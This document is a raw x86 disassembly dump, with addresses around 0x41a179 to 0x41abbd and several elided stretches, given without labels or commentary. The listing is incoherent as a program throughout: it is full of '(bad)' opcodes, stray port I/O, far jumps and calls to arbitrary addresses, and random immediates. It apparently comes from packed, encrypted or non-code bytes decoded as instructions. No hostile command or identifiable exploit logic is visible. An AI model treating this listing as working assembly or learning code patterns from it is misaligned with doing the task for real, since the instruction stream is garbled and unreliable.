  41a179:	rcr    BYTE PTR [eax-0x64],1
  41a17c:	pusha  
  41a17d:	or     esi,ecx
  41a17f:	mov    ecx,0xf420f470
  41a184:	push   ebx
  41a185:	dec    esp
  41a186:	pushf  
  41a187:	std    
  41a188:	push   esi
  41a189:	popa   
  41a18a:	push   cs
  41a18b:	sbb    ebp,DWORD PTR [edx+edi*4]
  41a18e:	sub    eax,0x15
	...
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	scas   al,BYTE PTR es:[edi]
  41a201:	pop    es
  41a202:	fist   WORD PTR ds:0x114e4
  41a208:	add    al,0x1
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	pop    esp
  41a20d:	ins    BYTE PTR es:[edi],dx
  41a20e:	pop    es
  41a20f:	sbb    ebp,edx
  41a211:	add    al,BYTE PTR [ecx]
  41a213:	jo     0x41a1a3
  41a215:	add    edi,eax
  41a217:	icebp  
  41a218:	pop    esi
  41a219:	sbb    BYTE PTR [ebx-0x28c76605],bl
  41a21f:	xchg   ebp,eax
  41a220:	add    DWORD PTR ds:0x8fdefde1,edi
  41a226:	pop    ss
  41a227:	call   0x53284cbb
  41a22c:	sbb    al,0x6a
  41a22e:	loop   0x41a1e9
  41a230:	ror    DWORD PTR [esi+esi*8],0xf6
  41a234:	cmp    ebp,eax
  41a236:	cwde   
  41a237:	and    DWORD PTR [esp+eax*8],ebp
  41a23a:	pop    edx
  41a23b:	test   DWORD PTR [ebx],edx
  41a23d:	push   ss
  41a23e:	mov    dl,0x6a
  41a240:	pop    eax
  41a241:	mov    ah,0xf0
  41a243:	fstp   DWORD PTR [ecx]
  41a245:	push   0xac373c8b
  41a24a:	or     esp,esi
  41a24c:	daa    
  41a24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a24e:	adc    DWORD PTR [ebx+edx*2],ebp
  41a251:	(bad)  [eax+eax*1]
  41a254:	clc    
  41a255:	pop    esp
  41a256:	push   ebx
  41a257:	das    
  41a258:	out    0x4f,al
  41a25a:	fsub   st,st(6)
  41a25c:	and    eax,ebx
  41a25e:	jg     0x41a23a
  41a260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a261:	retf   
  41a262:	cmp    ch,al
  41a264:	(bad)  
  41a265:	fdivp  st(3),st
  41a267:	xor    eax,0x7b7cd69c
  41a26c:	xor    eax,0x73003acc
  41a271:	fsub   QWORD PTR [esi]
  41a273:	(bad)  
  41a274:	call   0x89f1bfce
  41a279:	sbb    eax,0x80180d05
  41a27e:	dec    ebx
  41a27f:	cld    
  41a280:	jmp    0xb1bcb616
  41a285:	test   al,0xec
  41a287:	(bad)
  41a28a:	loop   0x41a2fa
  41a28c:	outs   dx,DWORD PTR ds:[esi]
  41a28d:	lock inc ecx
  41a28f:	pusha  
  41a290:	sub    BYTE PTR [ecx],cl
  41a292:	aas    
  41a293:	ror    BYTE PTR [eax],0x33
  41a296:	stc    
  41a297:	loopne 0x41a231
  41a299:	adc    al,0x7b
  41a29b:	dec    edi
  41a29c:	fnstcw WORD PTR [ebp*1-0x41f64498]
  41a2a3:	push   0x32
  41a2a5:	rcr    bl,1
  41a2a7:	mov    ah,0xdf
  41a2a9:	mov    ebp,0xf2db8d17
  41a2ae:	aam    0xc0
  41a2b0:	inc    ebp
  41a2b1:	maskmovq mm1,(bad)
  41a2b2:	test   DWORD PTR [eax],0xe566b54b
  41a2b8:	or     bh,BYTE PTR [ebx+0x3415510e]
  41a2be:	sub    eax,0x6450ce51
  41a2c3:	mov    ebx,0xf53cd40c
  41a2c8:	mov    ebx,0xe6ef6d06
  41a2cd:	xlat   BYTE PTR ds:[ebx]
  41a2ce:	fist   DWORD PTR [edi+0x5f2aeeb5]
  41a2d4:	fcomp  st(1)
  41a2d6:	lods   eax,DWORD PTR ds:[esi]
  41a2d7:	sbb    dl,BYTE PTR [ebx+0x2fd7b76c]
  41a2dd:	nop
  41a2de:	iret   
  41a2df:	mov    eax,0x626bc335
  41a2e4:	inc    edi
  41a2e5:	cmc    
  41a2e6:	fld    QWORD PTR [edx+eax*4]
  41a2e9:	(bad)  
  41a2ea:	xor    eax,DWORD PTR [edx-0x36]
  41a2ed:	inc    DWORD PTR [ebp-0x3e]
  41a2f0:	push   0x5d
  41a2f2:	je     0x41a31d
  41a2f4:	xchg   esp,eax
  41a2f5:	inc    esp
  41a2f6:	gs pop ebp
  41a2f8:	retf   
  41a2f9:	fwait
  41a2fa:	ins    DWORD PTR es:[edi],dx
  41a2fb:	push   ebp
  41a2fc:	inc    ecx
  41a2fd:	or     eax,0x7141d3b5
  41a302:	sub    bh,al
  41a304:	xchg   ecx,eax
  41a305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a306:	xor    ecx,edx
  41a308:	jle    0x41a2ef
  41a30a:	mov    ah,0x6f
  41a30c:	adc    al,0xe4
  41a30e:	push   edx
  41a30f:	das    
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	retf   
  41a381:	push   cs
  41a382:	clc    
  41a383:	aad    0xe8
  41a385:	adc    eax,0x1040001
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	pop    ds
  41a38d:	pop    eax
  41a38e:	mov    ch,0xc7
  41a390:	sub    cl,dh
  41a392:	into   
  41a393:	xchg   esi,eax
  41a394:	cmc    
  41a395:	(bad)  
  41a396:	xchg   esp,eax
  41a397:	retf   0x80d3
  41a39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a39b:	mov    ebp,0xc2ea22ea
  41a3a0:	sbb    BYTE PTR [ecx-0x7bb763af],0x21
  41a3a7:	add    eax,0xce89e173
  41a3ac:	mov    edi,0xe4dcc4a
  41a3b1:	jno    0x41a3e8
  41a3b3:	xchg   esi,eax
  41a3b4:	fisttp DWORD PTR [eax+0x10d5a2ef]
  41a3ba:	mov    edi,0x9792c2cb
  41a3bf:	jg     0x41a3b0
  41a3c1:	(bad)  
  41a3c2:	mov    ebp,0xc4f1c141
  41a3c7:	pop    esi
  41a3c8:	mov    ebx,0x240490f9
  41a3cd:	mov    eax,0x7f5b01d4
  41a3d2:	pop    esi
  41a3d3:	stos   DWORD PTR es:[edi],eax
  41a3d4:	pop    esp
  41a3d5:	or     BYTE PTR [esp+eax*4],dh
  41a3d8:	clc    
  41a3d9:	hlt    
  41a3da:	or     ebx,DWORD PTR [edx+0x38cfa5d3]
  41a3e0:	cmc    
  41a3e1:	sub    eax,0x9d2172b5
  41a3e6:	jmp    0x41a3af
  41a3e8:	ror    BYTE PTR [eax+0x1867f63a],0x4a
  41a3ef:	fisubr WORD PTR ds:0x90a7f3e9
  41a3f5:	lea    esp,[esi]
  41a3f7:	sub    al,0x78
  41a3f9:	add    esi,DWORD PTR [ebx-0x29]
  41a3fc:	arpl   WORD PTR [edx-0x28],si
  41a3ff:	es add ebp,ebx
  41a402:	popf   
  41a403:	cmp    dh,BYTE PTR [esi]
  41a405:	sub    dl,BYTE PTR ss:[eax-0x3e001efb]
  41a40c:	cmp    DWORD PTR [edx-0x40cc643],ecx
  41a412:	sub    al,0x55
  41a414:	sahf   
  41a415:	fist   DWORD PTR [ebp+eax*2-0x5ccad416]
  41a41c:	pop    ebp
  41a41d:	fidivr WORD PTR [ecx-0x5d489a31]
  41a423:	or     BYTE PTR [ebp-0x70033701],bl
  41a429:	xchg   ebx,eax
  41a42a:	sar    DWORD PTR [edx],0xb0
  41a42d:	jecxz  0x41a420
  41a42f:	lock sar DWORD PTR [edi-0x24],1
  41a433:	bound  esi,QWORD PTR [esi+0x69]
  41a436:	fwait
  41a437:	test   DWORD PTR [ecx+eiz*2],ecx
  41a43a:	cmp    bh,BYTE PTR [edi+0x70]
  41a43d:	mov    bl,0xd
  41a43f:	mov    eax,ds:0x5f4a2d15
  41a444:	into   
  41a445:	add    DWORD PTR [ebp-0x6],ebp
  41a448:	mov    ds:0x781babf1,al
  41a44d:	adc    esp,DWORD PTR [ecx-0x23]
  41a450:	cmp    DWORD PTR [edi-0x1],edx
  41a453:	out    0x2d,eax
  41a455:	dec    eax
  41a456:	or     al,0x2
  41a458:	dec    esp
  41a459:	out    0xbb,al
  41a45b:	in     eax,dx
  41a45c:	lock outs dx,BYTE PTR ds:[esi]
  41a45e:	adc    al,0x54
  41a460:	call   0x5836:0x72fe0119
  41a467:	inc    eax
  41a468:	fsubr  DWORD PTR [ecx+0x2a8d053]
  41a46e:	std    
  41a46f:	(bad)  
  41a470:	dec    ebp
  41a471:	sub    cl,dl
  41a473:	test   DWORD PTR [edi+0x4132fb54],ebp
  41a479:	test   DWORD PTR [ebx-0x61a04ef7],0xe854fada
  41a483:	lock int 0x82
  41a486:	jns    0x41a453
  41a488:	cdq    
  41a489:	push   0xffffff95
  41a48b:	xor    BYTE PTR [ebx+0x35],dh
  41a48e:	loopne 0x41a437
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	inc    esi
  41a501:	or     DWORD PTR [eax+ecx*2],edi
  41a504:	in     al,dx
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a50d:	vpsignd ymm7,ymm5,YMMWORD PTR [edx]
  41a512:	cdq    
  41a513:	enter  0x10e9,0x9d
  41a517:	mov    dh,0x56
  41a519:	sbb    edi,DWORD PTR [ebx]
  41a51b:	in     al,dx
  41a51c:	adc    BYTE PTR [esi+edi*2+0x3e],0x30
  41a521:	outs   dx,DWORD PTR ds:[esi]
  41a522:	ins    BYTE PTR es:[edi],dx
  41a523:	jbe    0x41a4ab
  41a525:	ficom  DWORD PTR [edx+0x7dabb299]
  41a52b:	ret    0xc427
  41a52e:	xor    BYTE PTR [esi+0x2fb5b6b2],cl
  41a534:	stos   DWORD PTR es:[edi],eax
  41a535:	(bad)  
  41a536:	xor    ebx,DWORD PTR ds:0xead06219
  41a53c:	iret   
  41a53d:	lds    eax,FWORD PTR [edx]
  41a53f:	add    eax,0x6e29ff53
  41a544:	xchg   esi,eax
  41a545:	xor    esp,DWORD PTR [ebx]
  41a547:	das    
  41a548:	data16 sub BYTE PTR [eax*2+0x454a8071],dh
  41a550:	sub    BYTE PTR [edi-0xb],bl
  41a553:	mov    ecx,0xf3784e15
  41a558:	inc    eax
  41a559:	inc    ecx
  41a55a:	hlt    
  41a55b:	dec    edi
  41a55c:	in     eax,0x6d
  41a55e:	loope  0x41a584
  41a560:	xchg   esp,eax
  41a561:	mov    dl,0xb0
  41a563:	jae    0x41a4ec
  41a565:	jmp    0x41a580
  41a567:	push   ebp
  41a568:	xchg   esp,eax
  41a569:	popf   
  41a56a:	inc    esi
  41a56b:	out    0x34,al
  41a56d:	mov    eax,0xc9d3c182
  41a572:	sub    esp,ecx
  41a574:	dec    eax
  41a575:	not    DWORD PTR [ebx+0x54]
  41a578:	adc    ebx,esi
  41a57a:	pop    es
  41a57b:	mov    edx,eax
  41a57d:	pusha  
  41a57e:	fist   WORD PTR [ecx+0xa034704]
  41a584:	sub    al,0xd5
  41a587:	mov    ebp,fs
  41a589:	mov    ah,0xb8
  41a58b:	stos   DWORD PTR es:[edi],eax
  41a58c:	pop    ecx
  41a58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a58e:	f2xm1  
  41a590:	mov    edx,eax
  41a592:	add    edi,DWORD PTR [ecx-0x7aa34636]
  41a598:	ds jle 0x41a592
  41a59b:	stos   BYTE PTR es:[edi],al
  41a59c:	idiv   DWORD PTR [esi-0x7b3bc3f3]
  41a5a2:	cs retf 
  41a5a4:	jle    0x41a56c
  41a5a6:	push   0x96c0a1f3
  41a5ab:	shr    BYTE PTR [edi+0x4cec4e6a],0x3d
  41a5b2:	outs   dx,DWORD PTR ds:[esi]
  41a5b3:	mov    dl,0x22
  41a5b5:	nop
  41a5b6:	and    BYTE PTR [ebp+0x55af82df],cl
  41a5bc:	lds    eax,FWORD PTR ds:0xe4aef3ce
  41a5c2:	add    al,0xb5
  41a5c4:	push   ebp
  41a5c5:	fnclex 
  41a5c7:	dec    edi
  41a5c8:	mov    edx,0x8a6b396f
  41a5cd:	retf   
  41a5ce:	or     eax,0xcae36f27
  41a5d3:	mov    ds:0xda3aab7b,al
  41a5d8:	in     al,dx
  41a5d9:	or     BYTE PTR [ecx+0x3dee3dfe],bl
  41a5df:	neg    DWORD PTR [eax-0x27c3abd8]
  41a5e5:	shr    esp,1
  41a5e7:	out    0xe0,eax
  41a5e9:	enter  0xb4c3,0x43
  41a5ed:	push   esi
  41a5ee:	cdq    
  41a5ef:	adc    BYTE PTR [eax-0x27],ah
  41a5f2:	loope  0x41a620
  41a5f4:	jmp    0x2612:0xfae532f3
  41a5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5fc:	out    dx,al
  41a5fd:	mov    esi,0x7be4b64b
  41a602:	add    BYTE PTR [esi+0x3aed4a73],dl
  41a608:	push   ebp
  41a609:	xrelease xchg DWORD PTR fs:[ebx+0xfa124d],ecx
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xdd4ea625
  41a682:	dec    ecx
  41a683:	leave  
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	mov    bl,0xd5
  41a68e:	push   ebp
  41a68f:	sbb    al,0xfd
  41a691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a692:	mov    al,0x6
  41a694:	inc    edi
  41a695:	call   0x54c6:0xf5694a7
  41a69c:	out    0x74,al
  41a69e:	and    BYTE PTR [ebp-0x68633e3e],bh
  41a6a4:	jo     0x41a6da
  41a6a6:	sbb    esp,edx
  41a6a8:	mov    WORD PTR [ebx+edx*4],ds
  41a6ab:	pushaw 
  41a6ad:	outs   dx,BYTE PTR ds:[esi]
  41a6ae:	mov    ebx,0x8621c387
  41a6b3:	dec    eax
  41a6b4:	dec    edi
  41a6b5:	clc    
  41a6b6:	push   ss
  41a6b7:	inc    ebp
  41a6b8:	out    dx,al
  41a6b9:	ret    
  41a6ba:	or     bl,dl
  41a6bc:	into   
  41a6bd:	(bad)  
  41a6be:	adc    al,dl
  41a6c0:	stc    
  41a6c1:	or     DWORD PTR [ecx+edx*4],esp
  41a6c4:	inc    ecx
  41a6c5:	sub    DWORD PTR [ebx+0xf9192eb],ecx
  41a6cb:	mov    dl,0x63
  41a6cd:	push   eax
  41a6ce:	xor    al,0xb6
  41a6d0:	pop    ecx
  41a6d1:	jmp    0x5619:0x367a90b
  41a6d8:	rol    DWORD PTR [eax+0x11],1
  41a6db:	adc    al,0x20
  41a6dd:	xlat   BYTE PTR ds:[ebx]
  41a6de:	xlat   BYTE PTR ds:[ebx]
  41a6df:	mov    esp,0xa503b9bb
  41a6e4:	rcr    DWORD PTR [esi+0x5c],cl
  41a6e7:	aad    0x33
  41a6e9:	jle    0x41a75a
  41a6eb:	icebp  
  41a6ec:	repnz xchg esp,eax
  41a6ee:	pop    ds
  41a6ef:	sbb    edx,esp
  41a6f1:	or     al,0xc9
  41a6f3:	not    DWORD PTR [esi+eax*4]
  41a6f6:	cmp    al,0x42
  41a6f8:	mov    cl,0x41
  41a6fa:	test   al,0x19
  41a6fc:	pop    esi
  41a6fd:	mov    dl,0xb6
  41a6ff:	and    edx,DWORD PTR [esi-0x34]
  41a702:	rol    DWORD PTR [esi+0x56dc7fe1],cl
  41a708:	jecxz  0x41a742
  41a70a:	push   cs
  41a70b:	xchg   ecx,eax
  41a70c:	nop
  41a70d:	test   eax,0x85adf1dc
  41a712:	adc    esi,eax
  41a714:	add    BYTE PTR [ecx-0x780f4aa7],bl
  41a71a:	mov    eax,0x5dd8b71c
  41a71f:	retf   0xbbb6
  41a722:	ins    DWORD PTR es:[edi],dx
  41a723:	pop    ebx
  41a724:	jmp    0x3653bac0
  41a729:	(bad)  
  41a72a:	push   eax
  41a72b:	adc    esi,ebp
  41a72d:	stc    
  41a72e:	imul   esp,DWORD PTR [ecx+0x6a],0x55
  41a732:	pop    es
  41a733:	mov    dh,0xe3
  41a735:	jno    0x41a6e0
  41a737:	jae    0x41a70d
  41a739:	or     BYTE PTR ds:0x549f3284,0x28
  41a740:	pop    edi
  41a741:	sbb    DWORD PTR [eax-0xfa246b6],esi
  41a747:	out    dx,eax
  41a748:	push   ebx
  41a749:	mov    bh,0xa4
  41a74b:	das    
  41a74c:	int3   
  41a74d:	ins    BYTE PTR es:[edi],dx
  41a74e:	xchg   ebx,eax
  41a74f:	sub    al,0x52
  41a751:	cmc    
  41a752:	mov    dl,0x19
  41a754:	aad    0x26
  41a756:	pop    ebp
  41a757:	test   al,0xa8
  41a759:	sahf   
  41a75a:	fiadd  DWORD PTR [eax-0x668d3d25]
  41a761:	push   eax
  41a762:	shr    BYTE PTR [ecx-0x1e],0xa8
  41a766:	jbe    0x41a73c
  41a768:	popa   
  41a769:	in     al,dx
  41a76a:	pop    esi
  41a76b:	mov    bl,0xbc
  41a76d:	ins    BYTE PTR es:[edi],dx
  41a76e:	cmp    dl,BYTE PTR [esi]
  41a770:	cmp    al,0xfb
  41a772:	or     cl,ah
  41a774:	fdiv   DWORD PTR [eax-0x1e422b32]
  41a77a:	cli    
  41a77b:	retf   
  41a77c:	pop    ecx
  41a77d:	mov    esp,0x2ca39486
  41a782:	mov    al,ds:0xc7929839
  41a787:	xor    DWORD PTR [ecx+0x49],edx
  41a78a:	outs   dx,BYTE PTR ds:[esi]
  41a78b:	mov    ds:0x3583ecc5,al
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x475327ca,al
  41a801:	lea    ebp,[ebp+0x56]
  41a804:	hlt    
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	jecxz  0x41a7c1
  41a80e:	scas   al,BYTE PTR es:[edi]
  41a80f:	dec    ebx
  41a810:	jno    0x41a7b6
  41a812:	cmp    DWORD PTR [edx+0x38035747],esi
  41a818:	adc    eax,0x16edd0a6
  41a81d:	cwde   
  41a81e:	adc    edi,ebp
  41a820:	xchg   esp,eax
  41a821:	sbb    BYTE PTR [eax-0x17],bh
  41a824:	xor    ch,bl
  41a826:	call   0xbeef8a2b
  41a82b:	(bad)  [ebx]
  41a82d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a82e:	test   eax,0xed480c2c
  41a833:	mov    dh,0xb
  41a835:	mov    ebp,0xd9d63d6b
  41a83a:	enter  0xe6d1,0x7a
  41a83e:	mov    dh,0x91
  41a840:	pop    ecx
  41a841:	adc    al,0x9f
  41a843:	repnz loopne 0x41a852
  41a846:	dec    ecx
  41a847:	mov    cl,0x2d
  41a849:	mov    dl,0x4c
  41a84b:	dec    esi
  41a84c:	fwait
  41a84d:	dec    edx
  41a84e:	je     0x41a7f1
  41a850:	mov    ebp,0x96157188
  41a855:	xor    eax,0x95458bea
  41a85a:	scas   al,BYTE PTR es:[edi]
  41a85b:	fdiv   DWORD PTR [ebp+0x57a0e59b]
  41a861:	ret    
  41a862:	mov    esi,0x60706d1
  41a867:	icebp  
  41a868:	pop    esi
  41a869:	jge    0x41a891
  41a86b:	inc    ebx
  41a86c:	mov    al,ds:0x89f78f
  41a871:	out    0xfa,al
  41a873:	mov    eax,ds:0x845a7296
  41a878:	mov    esp,ds
  41a87a:	dec    edi
  41a87b:	sub    BYTE PTR [eax],bh
  41a87d:	bound  edi,QWORD PTR [ebx]
  41a87f:	push   esi
  41a880:	xchg   ecx,eax
  41a881:	inc    ebx
  41a882:	sbb    edx,ecx
  41a884:	sub    edi,edi
  41a886:	jp     0x41a865
  41a888:	in     eax,dx
  41a889:	inc    esp
  41a88a:	out    dx,eax
  41a88b:	jne    0x41a858
  41a88d:	(bad)  [edi]
  41a88f:	sbb    bh,ch
  41a891:	stc    
  41a892:	shr    DWORD PTR [edi-0x466f6764],cl
  41a898:	push   es
  41a899:	mov    ds,WORD PTR [edx+0x2951070b]
  41a89f:	mov    al,ds:0x4dc4c774
  41a8a4:	cs jp  0x41a88c
  41a8a7:	sub    DWORD PTR [ebx],eax
  41a8a9:	cmp    al,0x34
  41a8ab:	jecxz  0x41a888
  41a8ad:	ficom  WORD PTR [edx-0x6a]
  41a8b0:	aam    0x5
  41a8b2:	or     ch,BYTE PTR [eax]
  41a8b4:	loope  0x41a860
  41a8b6:	jae    0x41a8c3
  41a8b8:	push   edi
  41a8b9:	out    dx,eax
  41a8ba:	(bad)  
  41a8bb:	pop    ds
  41a8bc:	or     DWORD PTR [eax-0x554a70f],0x73
  41a8c3:	pop    ebx
  41a8c4:	mov    edx,0x79dc1242
  41a8c9:	dec    ebp
  41a8ca:	sbb    al,0xf7
  41a8cc:	jns    0x41a8a5
  41a8ce:	rol    BYTE PTR [ebp-0x52],1
  41a8d1:	pop    es
  41a8d2:	sub    ebx,0xfffffff8
  41a8d5:	push   0xdb6e5700
  41a8da:	jbe    0x41a8c8
  41a8dc:	imul   DWORD PTR [edi+0x794768d4]
  41a8e2:	(bad)  [ebx*1-0xa734a01]
  41a8e9:	push   ebp
  41a8ea:	mov    ch,0xb3
  41a8ec:	mov    gs,WORD PTR [edi-0x41]
  41a8ef:	ja     0x41a915
  41a8f1:	cld    
  41a8f2:	repz lock add esp,edi
  41a8f6:	into   
  41a8f7:	inc    esp
  41a8f8:	ret    0x4796
  41a8fb:	lea    ebx,[ebp*2+0x5f3ecf7b]
  41a902:	mov    ch,0xa2
  41a904:	inc    eax
  41a905:	test   BYTE PTR [ebx-0x37ada823],ah
  41a90b:	or     eax,0xbb97f7c4
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	pop    edx
  41a981:	dec    ecx
  41a982:	or     al,BYTE PTR [edi+0x119f8]
  41a988:	add    al,0x1
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	popf   
  41a98d:	fld    st(4)
  41a98f:	cli    
  41a990:	clc    
  41a991:	jmp    0x7d66:0xc28c252e
  41a998:	jp     0x41a9b1
  41a99a:	jp     0x41a9f8
  41a99c:	aad    0x5
  41a99e:	and    eax,0xf1a5eb3e
  41a9a3:	dec    ebx
  41a9a4:	sbb    DWORD PTR [esp+esi*2+0x1bc15627],ecx
  41a9ab:	aam    0x9d
  41a9ad:	and    BYTE PTR [esi+0x7cf56ac5],bh
  41a9b3:	and    eax,0x2767e0da
  41a9b8:	mov    al,ds:0x7b7ab9d6
  41a9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9be:	lds    ebp,FWORD PTR [ecx+0x22568e74]
  41a9c4:	push   edx
  41a9c5:	inc    edx
  41a9c6:	sbb    esi,esp
  41a9c8:	or     eax,0xdc43bf47
  41a9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ce:	or     al,0xb6
  41a9d0:	cld    
  41a9d1:	outs   dx,BYTE PTR ds:[esi]
  41a9d2:	int3   
  41a9d3:	xchg   ecx,eax
  41a9d4:	sub    DWORD PTR ds:0x7f3188b4,esp
  41a9da:	inc    esi
  41a9db:	push   ss
  41a9dc:	pop    esp
  41a9dd:	pop    ecx
  41a9de:	(bad)  fs:[esi]
  41a9e1:	sbb    eax,0x7c1aa8c3
  41a9e6:	stc    
  41a9e7:	(bad)  
  41a9e8:	xlat   BYTE PTR ds:[ebx]
  41a9e9:	push   ecx
  41a9ea:	popf   
  41a9eb:	imul   edi,DWORD PTR [edi+0x1d793bf2],0x22
  41a9f2:	cmc    
  41a9f3:	aam    0xc1
  41a9f5:	push   0x5
  41a9f7:	loope  0x41aa3a
  41a9f9:	push   cs
  41a9fa:	push   ss
  41a9fb:	rcl    BYTE PTR [ebx],0x4c
  41a9fe:	cmp    BYTE PTR [esi+esi*2+0x3a78593a],dh
  41aa05:	sti    
  41aa06:	lea    ebp,[ebx+0x15caebf9]
  41aa0c:	loope  0x41aa44
  41aa0e:	mov    eax,ds:0xeeead64
  41aa13:	or     eax,ebx
  41aa15:	(bad)  
  41aa17:	and    eax,0xe85d6828
  41aa1c:	cli    
  41aa1d:	mov    dl,0x9a
  41aa1f:	test   eax,0x56ec873e
  41aa24:	ins    DWORD PTR es:[edi],dx
  41aa25:	push   ds
  41aa26:	sbb    dh,BYTE PTR [edi+0x235cc977]
  41aa2c:	icebp  
  41aa2d:	sub    DWORD PTR [edi+0x72db0d56],edi
  41aa33:	and    DWORD PTR ds:[ecx+0x4f],0x9d8aed4e
  41aa3b:	call   0x8e8f1c4a
  41aa40:	push   cs
  41aa41:	sbb    BYTE PTR ds:0xfdbefc40,bh
  41aa47:	sbb    al,0xfc
  41aa49:	shl    DWORD PTR [esp+eax*2-0x5e048fb6],cl
  41aa50:	jo     0x41aa10
  41aa52:	add    DWORD PTR [edx],ebx
  41aa54:	lock (bad) 
  41aa56:	adc    eax,0x6f953014
  41aa5b:	cmp    bl,BYTE PTR [edx-0x262e4909]
  41aa61:	into   
  41aa62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa63:	bound  eax,QWORD PTR [ebp-0x6ea3739]
  41aa69:	fisttp QWORD PTR fs:[ebp+edi*1-0x592cc479]
  41aa71:	lahf   
  41aa72:	and    eax,esp
  41aa74:	xchg   DWORD PTR es:[ebx-0x7882efc0],ebx
  41aa7b:	jmp    0xf177:0xb52c1240
  41aa82:	push   es
  41aa83:	sub    al,0x1d
  41aa85:	shr    DWORD PTR gs:[edx+0x478fe3e0],0x75
  41aa8d:	jbe    0x41aae2
  41aa8f:	jmp    0x41aa91
	...
  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	adc    al,0x6d
  41ab02:	lods   al,BYTE PTR ds:[esi]
  41ab03:	add    esp,edi
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	rcr    DWORD PTR [ebx],0xa2
  41ab0f:	pop    ebp
  41ab10:	mov    al,ds:0x6794d2bb
  41ab15:	mov    ch,0x7d
  41ab17:	mov    WORD PTR [ebx+0x7e9f33fe],cs
  41ab1d:	lahf   
  41ab1e:	nop
  41ab1f:	ins    DWORD PTR es:[edi],dx
  41ab20:	push   ecx
  41ab21:	das    
  41ab22:	xchg   edx,eax
  41ab23:	add    ah,al
  41ab25:	jae    0x41ab69
  41ab27:	test   esp,ebx
  41ab29:	sbb    BYTE PTR [ecx],cl
  41ab2b:	xchg   edx,eax
  41ab2c:	pop    ebp
  41ab2d:	sub    ecx,DWORD PTR cs:[edi-0xf2b04e5]
  41ab34:	sub    eax,0xe42c3b
  41ab39:	lods   al,BYTE PTR ds:[esi]
  41ab3a:	shl    edi,cl
  41ab3c:	imul   ebx,DWORD PTR [esi+0x7eb7309c],0x8868b6c3
  41ab46:	ficomp DWORD PTR [edx]
  41ab48:	leave  
  41ab49:	push   0xffffff9b
  41ab4b:	aas    
  41ab4c:	(bad)  
  41ab4d:	call   0x9243:0xd928d83b
  41ab54:	jge    0x41ab99
  41ab56:	imul   edi,ebx,0xffffffda
  41ab59:	call   0xe169:0x9dd96fea
  41ab60:	gs and cl,dh
  41ab63:	mov    edx,0xb7a2100c
  41ab68:	mov    esp,0x6c026725
  41ab6d:	push   ecx
  41ab6e:	pop    DWORD PTR [ecx+0x5]
  41ab71:	push   ds
  41ab72:	xchg   BYTE PTR [ecx],ah
  41ab74:	inc    edi
  41ab75:	ins    BYTE PTR es:[edi],dx
  41ab76:	xor    eax,0x444a2ff6
  41ab7b:	xor    al,0x16
  41ab7d:	lock mov dh,0x44
  41ab80:	rol    DWORD PTR [ebp+0x1e933eb6],1
  41ab86:	mov    ?,WORD PTR [edi-0xd738411]
  41ab8c:	or     BYTE PTR [eax-0x45f0c7a7],0x5a
  41ab93:	arpl   si,ax
  41ab95:	loope  0x41ac13
  41ab97:	jne    0x41ab83
  41ab99:	push   ebx
  41ab9a:	imul   DWORD PTR [edx]
  41ab9c:	xchg   ecx,eax
  41ab9d:	ins    BYTE PTR es:[edi],dx
  41ab9e:	and    al,dh
  41aba0:	lds    eax,FWORD PTR [ebx+0x5cdcf5e6]
  41aba6:	pop    ss
  41aba7:	mov    eax,ecx
  41aba9:	call   0x7786a6f4
  41abae:	sub    ah,BYTE PTR [edi+0x1e]
  41abb1:	mov    esi,0x94354a4f
  41abb6:	pop    ebx
  41abb7:	jno    0x41ab93
  41abb9:	in     al,dx
  41abba:	xor    esp,DWORD PTR [edx+eax*4]
  41abbd:	or     dl,bl
